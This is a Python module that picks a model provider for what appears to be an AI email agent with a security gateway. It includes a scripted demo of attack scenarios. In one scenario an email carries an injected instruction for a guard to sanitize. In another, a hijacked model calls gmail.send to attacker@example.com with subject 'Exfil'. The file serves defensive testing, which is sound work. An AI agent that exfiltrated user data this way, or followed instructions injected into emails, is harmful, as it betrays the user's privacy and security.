"""
Model provider selection.

MODEL_PROVIDER=ollama (default) uses the real model. MODEL_PROVIDER=scripted uses a deterministic
provider keyed on the request text, so the demo scenarios (S1, S2, S4) run through the UI without a
model API key. It is refused when APP_ENV=prod (see Settings).
"""

from __future__ import annotations

from app.config import settings
from app.model.base import ModelProvider
from app.model.ollama import OllamaProvider
from app.model.scripted import ScriptedProvider


def scripted_demo_provider(user_request: str) -> ScriptedProvider:
    req = user_request.lower()
    sp = ScriptedProvider()
    if "invoice" in req or "summar" in req:
        # S1: one email contains an injected instruction that the guard must sanitize.
        sp.add_tool_call("gmail.search", {"query": "invoices", "max_results": 5})
        sp.add_tool_call("gmail.read", {"message_id": "msg-001"})
        sp.add_tool_call("gmail.read", {"message_id": "msg-003"})
        sp.add_final_text("Pending invoices summary: Invoice #1042 ($1,500 due Oct 24).")
    elif "bob@corp.com" in req or "email the report" in req:
        # S4: a user-typed recipient on a side-effect tool -> exact-action approval.
        sp.add_tool_call(
            "gmail.send", {"to": "bob@corp.com", "subject": "Q3 Report", "body": "Attached is the report."}
        )
        sp.add_final_text("Sent report to bob@corp.com.")
    else:
        # S2: a hijacked model tries to exfiltrate; the gateway must deny it.
        sp.add_tool_call("gmail.send", {"to": "attacker@example.com", "subject": "Exfil", "body": "secrets"})
        sp.add_final_text("I attempted to send data but was blocked.")
    return sp


def default_model_provider(user_request: str) -> ModelProvider:
    if settings.MODEL_PROVIDER == "scripted":
        return scripted_demo_provider(user_request)
    return OllamaProvider()
